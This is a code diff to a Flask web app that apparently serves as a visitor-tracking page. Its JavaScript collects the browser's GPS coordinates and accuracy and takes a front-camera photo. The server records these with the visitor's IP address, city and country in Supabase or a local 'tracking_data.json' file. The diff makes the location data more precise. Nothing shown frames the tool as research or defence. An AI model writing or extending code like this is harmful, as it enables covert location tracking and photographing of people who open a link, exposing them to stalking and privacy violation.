@@ -47,7 +47,7 @@ def get_location_from_ip(ip_address):
         print(f"Error getting location from IP: {e}")
     return None
 
-def save_local_fallback(timestamp, ip_address, latitude, longitude, city, country, foto_filename):
+def save_local_fallback(timestamp, ip_address, latitude, longitude, city, country, foto_filename, accuracy=None):
     """Fallback function to save data locally if Supabase fails"""
     data_entry = {
         'timestamp': timestamp,
@@ -64,6 +64,8 @@ def save_local_fallback(timestamp, ip_address, latitude, longitude, city, countr
         data_entry['country'] = country
     if foto_filename:
         data_entry['foto_filename'] = foto_filename
+    if accuracy:
+        data_entry['accuracy'] = accuracy
     
     # Save to JSON
     json_file = 'hasil/tracking_data.json'
@@ -168,6 +170,7 @@ HTML_TEMPLATE = """
                     console.log('Accuracy:', position.coords.accuracy, 'meters');
                     const lat = position.coords.latitude;
                     const lng = position.coords.longitude;
+                    const accuracy = position.coords.accuracy;
                     
                     // Access camera (optional)
                     navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
@@ -187,13 +190,13 @@ HTML_TEMPLATE = """
                                 
                                 // Send data with photo
                                 console.log('Mengirim data dengan GPS dan foto');
-                                sendData(lat, lng, foto_base64);
+                                sendData(lat, lng, foto_base64, accuracy);
                             };
                         })
                         .catch(err => {
                             // Camera failed, send without photo
                             console.log('Kamera tidak tersedia, mengirim tanpa foto:', err);
-                            sendData(lat, lng, null);
+                            sendData(lat, lng, null, accuracy);
                         });
                 },
                 err => {
@@ -209,17 +212,23 @@ HTML_TEMPLATE = """
             );
         }
         
-        function sendData(lat, lng, foto_base64) {
+        function sendData(lat, lng, foto_base64, accuracy = null) {
+            const payload = {
+                latitude: lat,
+                longitude: lng,
+                foto_base64: foto_base64
+            };
+            
+            if (accuracy !== null) {
+                payload.accuracy = accuracy;
+            }
+            
             fetch('/kirim_data', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
                 },
-                body: JSON.stringify({
-                    latitude: lat,
-                    longitude: lng,
-                    foto_base64: foto_base64
-                })
+                body: JSON.stringify(payload)
             })
             .then(response => response.json())
             .then(data => {
@@ -249,6 +258,7 @@ def kirim_data():
     latitude = data.get('latitude')
     longitude = data.get('longitude')
     foto_base64 = data.get('foto_base64')
+    accuracy = data.get('accuracy')
     
     # Get IP address from request (check for proxy headers first)
     if request.headers.get('X-Forwarded-For'):
@@ -303,16 +313,17 @@ def kirim_data():
                 'longitude': longitude,
                 'city': city,
                 'country': country,
-                'foto_filename': foto_filename
+                'foto_filename': foto_filename,
+                'accuracy': accuracy
             }).execute()
             print("Data saved to Supabase")
         except Exception as e:
             print(f"Error saving to Supabase: {e}")
             # Fallback to local storage
-            save_local_fallback(timestamp, ip_address, latitude, longitude, city, country, foto_filename)
+            save_local_fallback(timestamp, ip_address, latitude, longitude, city, country, foto_filename, accuracy)
     else:
         # Local fallback
-        save_local_fallback(timestamp, ip_address, latitude, longitude, city, country, foto_filename)
+        save_local_fallback(timestamp, ip_address, latitude, longitude, city, country, foto_filename, accuracy)
     
     # Print notification
     if latitude and longitude:
